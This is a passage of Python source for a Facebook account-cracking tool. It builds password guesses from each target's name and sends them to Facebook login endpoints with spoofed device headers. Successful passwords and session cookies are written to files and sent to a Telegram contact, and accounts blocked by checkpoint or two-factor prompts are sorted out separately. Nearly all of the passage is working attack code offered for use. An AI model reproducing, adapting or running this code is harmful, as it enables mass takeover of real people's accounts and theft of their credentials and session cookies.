            __COUNTRYPAS__ = input(f"{xpx} {R}INPUT PASSLIST {xpxx} ")
            lists = {
                "1": ["firstlast","first12","@1234@","@123456@","first2025","@@@###","@@@@####","first098","first112233","000999","first321","first10","first@1212","first4321","first25","22558800","77889900","first@#","99887766","09876543"],
                "2": ["first123","first@1234","first@12345","first786","first110","firstlast","firstlast12","firstlast123","firstlast12345","first@123","last123","last12345"],
                "3": ["firstlast","first last","first123","57273200","59039200","234567","708090","firstlast123","firstlast1234","first123","first2025","first@","first@@","57273200"],
                "4": ["first123","first12345","first@123","first@1234","first last","firstlast123","firstlast@123","first last123","first123456789","first123@","first123@@","first12345@"]
            }
            self.plist = lists.get(__COUNTRYPAS__, ["first first","first last","first123","last last","last first","first1234","first12345","first123456","first 123","first 1234","first 12345","first 123456","first 1234567","first 12","first12","first@123","first#123","first_123","first-123","first.last","first123!","first@2024","first#2024","first_2024"])
        else:
            try:
                clear_screen()
                print(logo)
                print(f"{xp} {R}PASSLIST LIMIT 5{G}/{W}20")
                __LINE__()
                __PASSFM__ = min(int(input(f"{xpx} {R}PASSLIST LIMIT {xpxx} ")), 20)
            except:
                __PASSFM__ = 5
            clear_screen()
            print(logo)
            print(f"{xp} {R}EXAMPLE  {xpxx} firstlast {G}/{W} first12 {G}/{W} first123 ")
            __LINE__()
            self.plist = [input(f"{xp} {R}ENTER PASSLIST {G}<[{W}{i+1}{G}]> {xpxx} ") for i in range(__PASSFM__)]

        clear_screen()
        print(logo)
        print(f"{xp1} {R}AUTO SPEED {G}<[{W}30{G}]> ")
        print(f"{xp2} {R}CUSTOM SPEED ")
        __LINE__()
        __SPEED__ = input(f"{xpx} {R}INPUT SPEED {xpxx} ")
        __MAXX__ = 30 if __SPEED__ == "1" else max(30, min(60, int(input(f"{xpx} {R}INPUT SPEED {xpxx} ")))) if __SPEED__ == "2" else 30

        clear_screen()
        print(logo)
        print(f"{xp} {R}DO YOU WANT TO SHOW COOKIE...? ")
        __LINE__()
        __co__ = input(f"{xpx} {B}Y{G}/{R}N {xpxx} ")
        clear_screen()
        print(logo)
        print(f"{xp} {R}DO YOU WANT TO SHOW CP{G}/{W}2F IDS...? ")
        __LINE__()
        __cps__ = input(f"{xpx} {B}Y{G}/{R}N {xpxx} ")

        self.__COOKIE__.append('y' if __co__.lower() in ['y','yes','1'] else 'n')
        self.__CP__.append('y' if __cps__.lower() in ['y','yes','1'] else 'n')

        with ThreadPool(max_workers=__MAXX__) as __SEA__:
            clear_screen()
            print(logo)
            print(f"[/] {R}TOTAL{G}/{W}IDS {xpxx} {len(__fileckX__)} ")
            print(f"{xp} {R}IF NO RESULT ON{G}/{W}OFF AIRPLANE MODE")
            __LINE__()
            methods = {"1": self.__M1X__, "2": self.__M2X__, "3": self.__M3X__, "4": self.__M4X__, "5": self.__M5X__}
            for user in __fileckX__:
                try:
                    ids, names = user.split('|')
                except:
                    continue
                __SEA__.submit(methods.get(__METHODF__, self.__M1X__), ids, names, self.plist)

        print("\033[1;37m")
        __LINE__()
        print(f"{xp} THE PROCESS HAS COMPLETED...!")
        print(f"{xp} TOTAL OK{G}/{W}2F{G}/{W}CP {xpxx}{B} {len(self.oks)}{G}/{Y}{len(self.twf)}{G}/{R}{len(self.cps)}")
        print(f"{xp} TOTAL SUCCESSFUL ATTEMPTS (Reached Facebook) {xpxx} {G}{self.successful_attempts}")
        __LINE__()
        print(f"{xp} THANKS FOR USING.....! ")
        sys.exit()

    def _check_response(self, po, ids, pas, method):
        if not isinstance(po, dict): return 'fail', po
        if 'session_key' in po and 'access_token' in po and 'session_cookies' in po: return 'ok', po
        if 'error' in po:
            error_data = po.get('error', {})
            error_message = error_data.get('message', '').lower()
            error_code = error_data.get('code')
            if ('two-factor' in error_message or 'login approval' in error_message) and error_code in [400,401,403,405]: return '2f', po
            if ('checkpoint' in error_message or 'account locked' in error_message) and error_code in [400,401,403,405]: return 'cp', po
        return 'fail', po

    def _save_results(self, ids, pas, cookie, result_type, method):
        paths = [(sd_folder, 'FILE', f'SEA-{method}-{t}.txt') for t in ['OK','2F','CP']]
        if result_type == 'ok':
            data = ids + '/' + pas + '/' + cookie + '\n'
            for base, folder, fname in paths:
                with open(os.path.join(base, folder, fname), 'a') as f: f.write(data)
            try:
                with open(os.path.join(sdcard_folder, 'FILE', f'PS-{method}-OK.txt'), 'a') as f: f.write(data)
            except: pass
        elif result_type in ['2f','cp']:
            data = ids + '/' + pas + '\n'
            suffix = '2F' if result_type == '2f' else 'CP'
            with open(os.path.join(sd_folder, 'FILE', f'SEA-{method}-{suffix}.txt'), 'a') as f: f.write(data)
            try:
                with open(os.path.join(sdcard_folder, 'FILE', f'PS-{method}-{suffix}.txt'), 'a') as f: f.write(data)
            except: pass

    def __M1X__(self, ids, names, passlist):
        retry_count = 0
        while retry_count <= 2:
            try:
                color = random.choice(["\x1b[38;5;196m","\x1b[38;5;208m","\033[1;30m","\x1b[38;5;160m","\x1b[38;5;46m","\033[1;33m","\033[38;5;6m","\033[1;35m","\033[1;36m","\033[1;37m"])
                sys.stdout.write(f'\r{xp}{W}-{G}<[{W}PS{G}-{W}{G}]>>{W}-{G}<<[{color}{self.loop}{G}+{W}M1{G}]>>{W}--{G}<<[{G}{len(self.oks)}{G}+{Y}{len(self.twf)}{G}+{P}{len(self.cps)}{G}]> {W}-{G}<[{G}{self.successful_attempts}{G}/{W}ATT{G}]> ')
                sys.stdout.flush()
                fn = names.split(' ')[0]
                ln = names.split(' ')[1] if len(names.split(' ')) > 1 else fn
                for pw in passlist:
                    pas = pw.replace('first', fn.lower()).replace('First', fn).replace('last', ln.lower()).replace('Last', ln).replace('Name', names).replace('name', names.lower())
                    ua = _____UpDaTe_S1_____()
                    accessToken = random.choice(['350685531728|62f8ce9f74b12f84c123cc23437a4a32','256002347743983|374e60f8b9bb6b8cbb30f78030438895'])
                    pax = random.choice(["PWD_FB4A","PWD_BROWSER"])
                    adid = ''.join(random.Random().choices(string.hexdigits, k=16))
                    device_id = str(uuid.uuid4())
                    __locale__ = {"en_US":"US","en_GB":"GB","es_ES":"ES","fr_FR":"FR","ar_SA":"SA","bn_BD":"BD","ja_JP":"JP","de_DE":"DE","pt_BR":"BR"}
                    country_locale = random.choice(list(__locale__.keys()))
                    country_code = __locale__[country_locale]
                    data = {"adid":adid,"format":"json","device_id":device_id,"cpl":"true","family_device_id":str(uuid.uuid4()),"credentials_type":"device_based_login_password","error_detail_type":"button_with_disabled","source":"device_based_login","email":ids,"password":f"#{pax}:0:{int(time.time())}:{pas}","access_token":accessToken,"generate_session_cookies":"1","advertiser_id":str(uuid.uuid4()),"currently_logged_in_userid":"0","locale":country_locale,"client_country_code":country_code,"method":"auth.login","fb_api_req_friendly_name":"authenticate","fb_api_caller_class":"com.facebook.account.login.protocol.Fb4aAuthHandler","api_key":"882a8490361da98702bf97a021ddc14d"}
                    headers = {"User-Agent":ua,"Accept-Encoding":"gzip, deflate","Accept":"*/*","Connection":"keep-alive","Content-Type":"application/x-www-form-urlencoded","Host":"graph.facebook.com","X-FB-Net-HNI":str(random.randint(11111,99999)),"X-FB-SIM-HNI":str(random.randint(11111,99999)),"X-FB-Connection-Type":random.choice(["CELL.4G","WIFI","MOBILE.LTE","CELL.5G"]),"X-Tigon-Is-Retry":"False","x-fb-session-id":f"nid={uuid.uuid4().hex};pid=Main;tid={random.randint(100,500)};nc=1;fc=0;bc=0;cid={uuid.uuid4().hex}","x-fb-device-group":str(random.randint(4000,6000)),"X-FB-Friendly-Name":"authenticate","X-FB-Request-Analytics-Tags":"graphservice","X-FB-HTTP-Engine":"Liger","X-FB-Client-IP":"True","X-FB-Server-Cluster":"True","x-fb-connection-token":uuid.uuid4().hex}
                    try:
                        response = requests.post("https://graph.facebook.com/auth/login", data=data, headers=headers, timeout=(5,15))
                        po = response.json()
                        self.successful_attempts += 1
                    except: continue
                    result, _ = self._check_response(po, ids, pas, "M1")
                    if result == 'ok':
                        ckkk = ';'.join(i['name']+'='+i['value'] for i in po['session_cookies'])
                        ssbb = base64.b64encode(os.urandom(18)).decode().replace('=','').replace('+','_').replace('/','-')
                        cookie = f'sb=Cracked.By-NooR_Tool;{ssbb};{ckkk}'
                        print(f'\r{xp}{W}-{G}<[{B}PS-OK{G}]>{G} ' + ids + f' / ' + pas)
                        if 'y' in self.__COOKIE__: print(f'\r{xp}{W}-{G}<[{B}COOKIE{G}]> ' + cookie + '\n')
                        self._save_results(ids, pas, cookie, 'ok', 'M1')
                        self.oks.append(ids)
                        ok_message = f"PS | @p7s7s ✅ OK\n❖ - 𝐔𝐒𝐄𝐑𝐍𝐀𝐌 : {ids}\n❖ - 𝐏𝐀𝐒𝐒𝐖𝐑𝐃 : {pas}\n\n❖ - COOKIES : {cookie}"
                        send_telegram_message(ok_message)
                        break
                    elif result == 'cp':
                        if 'y' in self.__CP__: print(f'\r{xp}{W}-{G}<[{R}PS-CP{G}]>{P} ' + ids + f' / ' + pas)
                        self._save_results(ids, pas, '', 'cp', 'M1')
                        self.cps.append(ids)
                        cp_message = f"PS | @p7s7s ⚠️ CP\n❖ - 𝐔𝐒𝐄𝐑𝐍𝐀𝐌 : {ids}\n❖ - 𝐏𝐀𝐒𝐒𝐖𝐑𝐃 : {pas}"
                        send_telegram_message(cp_message)
                        break
                    elif result == '2f':
                        if 'y' in self.__CP__: print(f'\r{xp}{W}-{G}<[{Y}PS-2F{G}]>{Y} ' + ids + f' / ' + pas)
                        self._save_results(ids, pas, '', '2f', 'M1')
                        self.twf.append(ids)
                        break
                self.loop += 1
                break
            except:
                retry_count += 1
                if retry_count > 2: break
                time.sleep(1)

    def __M2X__(self, ids, names, passlist):
        retry_count = 0
        while retry_count <= 2:
            try:
                color = random.choice(["\x1b[38;5;196m","\x1b[38;5;208m","\033[1;30m","\x1b[38;5;160m","\x1b[38;5;46m","\033[1;33m","\033[38;5;6m","\033[1;35m","\033[1;36m","\033[1;37m"])
                sys.stdout.write(f'\r{xp}{W}-{G}<[{W}PS{G}-{W}{G}]>{W}-{G}<[{color}{self.loop}{G}/{W}M2{G}]>{W}-{G}<[{G}{len(self.oks)}{G}/{Y}{len(self.twf)}{G}/{P}{len(self.cps)}{G}]> {W}-{G}<[{G}{self.successful_attempts}{G}/{W}ATT{G}]> ')
                sys.stdout.flush()
                fn = names.split(' ')[0]
                ln = names.split(' ')[1] if len(names.split(' ')) > 1 else fn
                for pw in passlist:
                    pas = pw.replace('first', fn.lower()).replace('First', fn).replace('last', ln.lower()).replace('Last', ln).replace('Name', names).replace('name', names.lower())
                    ua = _____UpDaTe_S1_____()
                    accessToken = random.choice(['350685531728|62f8ce9f74b12f84c123cc23437a4a32','256002347743983|374e60f8b9bb6b8cbb30f78030438895'])
                    pax = random.choice(["PWD_FB4A","PWD_BROWSER"])
                    adid = ''.join(random.Random().choices(string.hexdigits, k=16))
                    device_id = str(uuid.uuid4())
                    __locale__ = {"en_US":"US","en_GB":"GB","es_ES":"ES","fr_FR":"FR","ar_SA":"SA","bn_BD":"BD","ja_JP":"JP","de_DE":"DE","pt_BR":"BR"}
                    country_locale = random.choice(list(__locale__.keys()))
                    country_code = __locale__[country_locale]
                    data = {'adid':adid,'format':'json','device_id':device_id,'email':ids,'password':f"#{pax}:0:{int(time.time())}:{pas}",'generate_analytics_claims':'1','community_id':'','cpl':'true','try_num':'1','family_device_id':str(uuid.uuid4()),'credentials_type':'password','source':'login','error_detail_type':'button_with_disabled','enroll_misauth':'false','generate_session_cookies':'1','generate_machine_id':'1','currently_logged_in_userid':'0','locale':country_locale,'client_country_code':country_code,'fb_api_req_friendly_name':'authenticate','api_key':'62f8ce9f74b12f84c123cc23437a4a32','access_token':accessToken}
                    headers = {'User-Agent':ua,'Accept-Encoding':'gzip, deflate','Connection':'close','Content-Type':'application/x-www-form-urlencoded','Host':'graph.facebook.com','X-FB-Net-HNI':str(random.randint(11111,99999)),'X-FB-SIM-HNI':str(random.randint(11111,99999)),'Authorization':f'OAuth {accessToken}','X-FB-Connection-Type':random.choice(["CELL.4G","WIFI","MOBILE.LTE","CELL.5G"]),'X-Tigon-Is-Retry':'False','x-fb-session-id':f'nid={uuid.uuid4().hex};pid=Main;tid={random.randint(100,500)};nc=1;fc=0;bc=0;cid={uuid.uuid4().hex}','x-fb-device-group':str(random.randint(4000,6000)),'X-FB-Friendly-Name':'authenticate','X-FB-Request-Analytics-Tags':'graphservice','X-FB-HTTP-Engine':'Liger','X-FB-Client-IP':'True','X-FB-Server-Cluster':'True','x-fb-connection-token':uuid.uuid4().hex}
                    try:
                        response = requests.post("https://b-graph.facebook.com/auth/login", data=data, headers=headers, timeout=(5,15))
                        po = response.json()
                        self.successful_attempts += 1
                    except: continue
                    result, _ = self._check_response(po, ids, pas, "M2")
                    if result == 'ok':
                        ckkk = ';'.join(i['name']+'='+i['value'] for i in po['session_cookies'])
                        ssbb = base64.b64encode(os.urandom(18)).decode().replace('=','').replace('+','_').replace('/','-')
                        cookie = f'sb=Cracked.By-NooR_Tool;{ssbb};{ckkk}'
                        print(f'\r{xp}{W}-{G}<[{B}PS-OK{G}]>{G} ' + ids + f' / ' + pas)
                        if 'y' in self.__COOKIE__: print(f'\r{xp}{W}-{G}<[{B}COOKIE{G}]> ' + cookie + '\n')
                        self._save_results(ids, pas, cookie, 'ok', 'M2')
                        self.oks.append(ids)
                        ok_message = f"PS | @p7s7s ✅ OK\n❖ - 𝐔𝐒𝐄𝐑𝐍𝐀𝐌 : {ids}\n❖ - 𝐏𝐀𝐒𝐒𝐖𝐑𝐃 : {pas}\n\n❖ - COOKIES : {cookie}"
                        send_telegram_message(ok_message)
                        break
                    elif result == 'cp':
                        if 'y' in self.__CP__: print(f'\r{xp}{W}-{G}<[{R}PS-CP{G}]>{P} ' + ids + f' / ' + pas)
                        self._save_results(ids, pas, '', 'cp', 'M2')
                        self.cps.append(ids)
                        cp_message = f"PS | @p7s7s ⚠️ CP\n❖ - 𝐔𝐒𝐄𝐑𝐍𝐀𝐌 : {ids}\n❖ - 𝐏𝐀𝐒𝐒𝐖𝐑𝐃 : {pas}"
                        send_telegram_message(cp_message)
                        break
                    elif result == '2f':
                        if 'y' in self.__CP__: print(f'\r{xp}{W}-{G}<[{Y}PS-2F{G}]>{Y} ' + ids + f' / ' + pas)
                        self._save_results(ids, pas, '', '2f', 'M2')
                        self.twf.append(ids)
                        break
                self.loop += 1
                break
            except:
                retry_count += 1
                if retry_count > 2: break
                time.sleep(1)

    def __M3X__(self, ids, names, passlist):
        retry_count = 0
        while retry_count <= 2:
            try:
                color = random.choice(["\x1b[38;5;196m","\x1b[38;5;208m","\033[1;30m","\x1b[38;5;160m","\x1b[38;5;46m","\033[1;33m","\033[38;5;6m","\033[1;35m","\033[1;36m","\033[1;37m"])
                sys.stdout.write(f'\r[/]{W}{G}[{W}PS{G}-{W}{G}]{W}{G}[{color}{self.loop}{G}+{W}M3{G}]{W}{G}[{G}{len(self.oks)}{G}+{Y}{len(self.twf)}{G}+{P}{len(self.cps)}{G}] {W}-{G}<[{G}{self.successful_attempts}{G}/{W}ATT{G}]> ')
                sys.stdout.flush()
                fn = names.split(' ')[0]
                ln = names.split(' ')[1] if len(names.split(' ')) > 1 else fn
                for pw in passlist:
                    pas = pw.replace('first', fn.lower()).replace('First', fn).replace('last', ln.lower()).replace('Last', ln).replace('Name', names).replace('name', names.lower())
                    ua = _____UpDaTe_S2_____()
                    accessToken = random.choice(['350685531728|62f8ce9f74b12f84c123cc23437a4a32','256002347743983|374e60f8b9bb6b8cbb30f78030438895'])
                    pax = random.choice(["PWD_FB4A","PWD_BROWSER"])
                    adid = ''.join(random.Random().choices(string.hexdigits, k=16))
                    device_id = str(uuid.uuid4())
                    __locale__ = {"en_US":"US","en_GB":"GB","es_ES":"ES","fr_FR":"FR","ar_SA":"SA","bn_BD":"BD","ja_JP":"JP","de_DE":"DE","pt_BR":"BR"}
                    country_locale = random.choice(list(__locale__.keys()))
                    country_code = __locale__[country_locale]
                    data = {"adid":adid,"format":"json","device_id":device_id,"cpl":"true","family_device_id":str(uuid.uuid4()),"credentials_type":"device_based_login_password","error_detail_type":"button_with_disabled","source":"device_based_login","email":ids,"password":f"#{pax}:0:{int(time.time())}:{pas}","access_token":accessToken,"generate_session_cookies":"1","meta_inf_fbmeta":"","advertiser_id":str(uuid.uuid4()),"currently_logged_in_userid":"0","locale":country_locale,"client_country_code":country_code,"method":"auth.login","fb_api_req_friendly_name":"authenticate","fb_api_caller_class":"com.facebook.account.login.protocol.Fb4aAuthHandler","api_key":"882a8490361da98702bf97a021ddc14d"}
                    headers = {"User-Agent":ua,"Content-Type":"application/x-www-form-urlencoded","Host":"graph.facebook.com","X-FB-Net-HNI":str(random.randint(20000,40000)),"X-FB-SIM-HNI":str(random.randint(20000,40000)),"X-FB-Connection-Type":random.choice(["CELL.4G","WIFI","MOBILE.LTE","CELL.5G"]),"X-Tigon-Is-Retry":"False","x-fb-session-id":f"nid={uuid.uuid4().hex};pid=Main;tid={random.randint(100,500)};nc=1;fc=0;bc=0;cid={uuid.uuid4().hex}","x-fb-device-group":str(random.randint(4000,6000)),"X-FB-Friendly-Name":"authenticate","X-FB-Request-Analytics-Tags":"graphservice","X-FB-HTTP-Engine":"Liger","X-FB-Client-IP":"True","X-FB-Server-Cluster":"True","x-fb-connection-token":uuid.uuid4().hex}
                    try:
                        response = requests.post("https://api.facebook.com/auth/login", data=data, headers=headers, timeout=(5,15))
                        po = response.json()
                        self.successful_attempts += 1
                    except: continue
                    result, _ = self._check_response(po, ids, pas, "M3")
                    if result == 'ok':
                        ckkk = ';'.join(i['name']+'='+i['value'] for i in po['session_cookies'])
                        ssbb = base64.b64encode(os.urandom(18)).decode().replace('=','').replace('+','_').replace('/','-')
                        cookie = f'sb=Cracked.By-PS_Tool;{ssbb};{ckkk}'
                        print(f'\r[/]{W}-{G}[{B}PS-OK{G}]>{G} ' + ids + f' / ' + pas)
                        if 'y' in self.__COOKIE__: print(f'\r[/]{W}-{G}<[{B}COOKIE{G}]> ' + cookie + '\n')
                        self._save_results(ids, pas, cookie, 'ok', 'M3')
                        self.oks.append(ids)
                        ok_message = f"PS | @p7s7s ✅ OK\n❖ - 𝐔𝐒𝐄𝐑𝐍𝐀𝐌 : {ids}\n❖ - 𝐏𝐀𝐒𝐒𝐖𝐑𝐃 : {pas}\n\n❖ - COOKIES : {cookie}"
                        send_telegram_message(ok_message)
                        break
                    elif result == 'cp':
                        if 'y' in self.__CP__: print(f'\r[/]{W}-{G}<[{R}PS-CP{G}]>{P} ' + ids + f' / ' + pas)
                        self._save_results(ids, pas, '', 'cp', 'M3')
                        self.cps.append(ids)
                        cp_message = f"PS | @p7s7s ⚠️ CP\n❖ - 𝐔𝐒𝐄𝐑𝐍𝐀𝐌 : {ids}\n❖ - 𝐏𝐀𝐒𝐒𝐖𝐑𝐃 : {pas}"
                        send_telegram_message(cp_message)
                        break
                    elif result == '2f':
                        if 'y' in self.__CP__: print(f'\r[/]{W}-{G}<[{Y}PS-2F{G}]>{Y} ' + ids + f' / ' + pas)
                        self._save_results(ids, pas, '', '2f', 'M3')
                        self.twf.append(ids)
                        break
                self.loop += 1
                break
            except:
                retry_count += 1
                if retry_count > 2: break
                time.sleep(1)

    def __M4X__(self, ids, names, passlist):
        retry_count = 0
        while retry_count <= 2:
            try:
                color = random.choice(["\x1b[38;5;196m","\x1b[38;5;208m","\033[1;30m","\x1b[38;5;160m","\x1b[38;5;46m","\033[1;33m","\033[38;5;6m","\033[1;35m","\033[1;36m","\033[1;37m"])
                sys.stdout.write(f'\r{xp}{W}-{G}<[{W}PS{G}-{W}{G}]>{W}-{G}<[{color}{self.loop}{G}/{W}M4{G}]>{W}-{G}<[{G}{len(self.oks)}{G}/{Y}{len(self.twf)}{G}/{P}{len(self.cps)}{G}]> {W}-{G}<[{G}{self.successful_attempts}{G}/{W}ATT{G}]> ')
                sys.stdout.flush()
                fn = names.split(' ')[0]
                ln = names.split(' ')[1] if len(names.split(' ')) > 1 else fn
                for pw in passlist:
                    pas = pw.replace('first', fn.lower()).replace('First', fn).replace('last', ln.lower()).replace('Last', ln).replace('Name', names).replace('name', names.lower())
                    ua = _____UpDaTe_S2_____()
                    accessToken = random.choice(['350685531728|62f8ce9f74b12f84c123cc23437a4a32','256002347743983|374e60f8b9bb6b8cbb30f78030438895'])
                    pax = random.choice(["PWD_FB4A","PWD_BROWSER"])
                    adid = ''.join(random.Random().choices(string.hexdigits, k=16))
                    device_id = str(uuid.uuid4())
                    data = {"adid":adid,"format":"json","device_id":device_id,"email":ids,"password":f"#{pax}:0:{int(time.time())}:{pas}","session_id":str(uuid.uuid4()),"advertiser_id":str(uuid.uuid4()),"reg_instance":str(uuid.uuid4()),"logged_out_id":str(uuid.uuid4()),"hash_id":str(uuid.uuid4()),"sim_country":random.choice(["us","gb","fr","de","sa"]),"network_country":random.choice(["us","gb","fr","de","sa"]),"enroll_misauth":"false","generate_analytics_claims":"1","credentials_type":"password","source":"login","error_detail_type":"button_with_disabled","cpl":"true","generate_session_cookies":"1","generate_machine_id":"1","meta_inf_fbmeta":"","currently_logged_in_userid":"0","fb_api_req_friendly_name":"authenticate","fb_api_caller_class":"com.facebook.account.login.protocol.Fb4aAuthHandler"}
                    headers = {"Authorization":f"OAuth {accessToken}","X-FB-Connection-Bandwidth":str(random.randint(20000000,30000000)),"X-FB-Net-HNI":str(random.randint(900000,999999)),"X-FB-SIM-HNI":str(random.randint(20000,40000)),"X-FB-Friendly-Name":"authenticate","X-FB-Connection-Type":random.choice(["CELL.4G","WIFI","MOBILE.LTE","CELL.5G"]),"User-Agent":ua,"Accept-Encoding":"gzip, deflate","Content-Type":"application/x-www-form-urlencoded","X-FB-HTTP-Engine":"Liger"}
                    try:
                        response = requests.post("https://b-api.facebook.com/method/auth.login", data=data, headers=headers, timeout=(5,15))
                        po = response.json()
                        self.successful_attempts += 1
                    except: continue
                    result, _ = self._check_response(po, ids, pas, "M4")
                    if result == 'ok':
                        ckkk = ';'.join(i['name']+'='+i['value'] for i in po['session_cookies'])
                        ssbb = base64.b64encode(os.urandom(18)).decode().replace('=','').replace('+','_').replace('/','-')
                        cookie = f'sb=Cracked.By-NooR_Tool;{ssbb};{ckkk}'
                        print(f'\r{xp}{W}-{G}<[{B}PS-OK{G}]>{G} ' + ids + f' / ' + pas)
                        if 'y' in self.__COOKIE__: print(f'\r{xp}{W}-{G}<[{B}COOKIE{G}]> ' + cookie + '\n')
                        self._save_results(ids, pas, cookie, 'ok', 'M4')
                        self.oks.append(ids)
                        ok_message = f"PS | @p7s7s ✅ OK\n❖ - 𝐔𝐒𝐄𝐑𝐍𝐀𝐌 : {ids}\n❖ - 𝐏𝐀𝐒𝐒𝐖𝐑𝐃 : {pas}\n\n❖ - COOKIES : {cookie}"
                        send_telegram_message(ok_message)
                        break
                    elif result == 'cp':
                        if 'y' in self.__CP__: print(f'\r{xp}{W}-{G}<[{R}PS-CP{G}]>{P} ' + ids + f' / ' + pas)
                        self._save_results(ids, pas, '', 'cp', 'M4')
                        self.cps.append(ids)
                        cp_message = f"PS | @p7s7s ⚠️ CP\n❖ - 𝐔𝐒𝐄𝐑𝐍𝐀𝐌 : {ids}\n❖ - 𝐏𝐀𝐒𝐒𝐖𝐑𝐃 : {pas}"
                        send_telegram_message(cp_message)
                        break
                    elif result == '2f':
                        if 'y' in self.__CP__: print(f'\r{xp}{W}-{G}<[{Y}PS-2F{G}]>{Y} ' + ids + f' / ' + pas)
                        self._save_results(ids, pas, '', '2f', 'M4')
                        self.twf.append(ids)
                        break
                self.loop += 1
                break
            except:
                retry_count += 1
                if retry_count > 2: break
                time.sleep(1)

    def __M5X__(self, ids, names, passlist):
        retry_count = 0
        while retry_count <= 2:
            try:
                color = random.choice(["\x1b[38;5;196m","\x1b[38;5;208m","\033[1;30m","\x1b[38;5;160m","\x1b[38;5;46m","\033[1;33m","\033[38;5;6m","\033[1;35m","\033[1;36m","\033[1;37m"])
                sys.stdout.write(f'\r{xp}{W}-{G}<[{W}PS{G}-{W}{G}]>{W}-{G}<[{color}{self.loop}{G}/{W}M5{G}]>{W}-{G}<[{G}{len(self.oks)}{G}/{Y}{len(self.twf)}{G}/{R}{len(self.cps)}{G}]> {W}-{G}<[{G}{self.successful_attempts}{G}/{W}ATT{G}]> ')
                sys.stdout.flush()
                fn = names.split(' ')[0]
                ln = names.split(' ')[1] if len(names.split(' ')) > 1 else fn
                for pw in passlist:
                    pas = pw.replace('first', fn.lower()).replace('First', fn).replace('last', ln.lower()).replace('Last', ln).replace('Name', names).replace('name', names.lower())
                    ua = _____UpDaTe_S3_____()
                    accessToken = random.choice(['350685531728|62f8ce9f74b12f84c123cc23437a4a32','256002347743983|374e60f8b9bb6b8cbb30f78030438895'])
                    pax = random.choice(["PWD_FB4A","PWD_BROWSER"])
                    adid = ''.join(random.Random().choices(string.hexdigits, k=16))
                    device_id = str(uuid.uuid4())
                    data = {"adid":adid,"format":"json","device_id":device_id,"email":ids,"password":f"#{pax}:0:{int(time.time())}:{pas}","generate_analytics_claim":"1","community_id":"","cpl":"true","try_num":"1","family_device_id":str(uuid.uuid4()),"secure_family_device_id":str(uuid.uuid4()),"credentials_type":"password","generate_session_cookies":"1","error_detail_type":"button_with_disabled","source":"login","generate_machine_id":"1","currently_logged_in_userid":"0","locale":"ar_AR","client_country_code":"EG","fb_api_req_friendly_name":"authenticate","fb_api_caller_class":"Fb4aAuthHandler","api_key":"882a8490361da98702bf97a021ddc14d","access_token":accessToken}
                    headers = {"User-Agent":ua,"Accept-Encoding":"gzip, deflate","x-fb-connection-quality":"EXCELLENT","x-fb-friendly-name":"authenticate","x-fb-http-engine":"Liger","x-fb-client-ip":"True","x-fb-server-cluster":"True","authorization":f"OAuth {accessToken}"}
                    try:
                        response = requests.post("https://b-graph.facebook.com/auth/login", data=data, headers=headers, timeout=(5,15))
                        po = response.json()
                        self.successful_attempts += 1
                    except: continue
                    result, _ = self._check_response(po, ids, pas, "M5")
                    if result == 'ok':
                        ckkk = ';'.join(i['name']+'='+i['value'] for i in po['session_cookies'])
                        ssbb = base64.b64encode(os.urandom(18)).decode().replace('=','').replace('+','_').replace('/','-')
                        cookie = f'sb=Cracked.By-NooR_Tool;{ssbb};{ckkk}'
                        print(f'\r{xp}{W}-{G}<[{B}PS-OK{G}]>{G} ' + ids + f' / ' + pas)
                        if 'y' in self.__COOKIE__: print(f'\r{xp}{W}-{G}<[{B}COOKIE{G}]> ' + cookie + '\n')
                        self._save_results(ids, pas, cookie, 'ok', 'M5')
                        self.oks.append(ids)
                        ok_message = f"PS | @p7s7s ✅ OK\n❖ - 𝐔𝐒𝐄𝐑𝐍𝐀𝐌 : {ids}\n❖ - 𝐏𝐀𝐒𝐒𝐖𝐑𝐃 : {pas}\n\n❖ - COOKIES : {cookie}"
                        send_telegram_message(ok_message)
                        break
                    elif result == 'cp':
                        if 'y' in self.__CP__: print(f'\r{xp}{W}-{G}<[{R}PS-CP{G}]>{R} ' + ids + f' / ' + pas)
                        self._save_results(ids, pas, '', 'cp', 'M5')
                        self.cps.append(ids)
                        cp_message = f"PS | @p7s7s ⚠️ CP\n❖ - 𝐔𝐒𝐄𝐑𝐍𝐀𝐌 : {ids}\n❖ - 𝐏𝐀𝐒𝐒𝐖𝐑𝐃 : {pas}"
                        send_telegram_message(cp_message)
                        break
                    elif result == '2f':
                        if 'y' in self.__CP__: print(f'\r{xp}{W}-{G}<[{Y}PS-2F{G}]>{Y} ' + ids + f' / ' + pas)
                        self._save_results(ids, pas, '', '2f', 'M5')
                        self.twf.append(ids)
                        break
                self.loop += 1
                break
            except:
                retry_count += 1
                if retry_count > 2: break
                time.sleep(1)

if __name__ == "__main__":
    load_models_from_github()
    load_user_agents_from_github()
    __SEAXNOOR__().__MENU__()
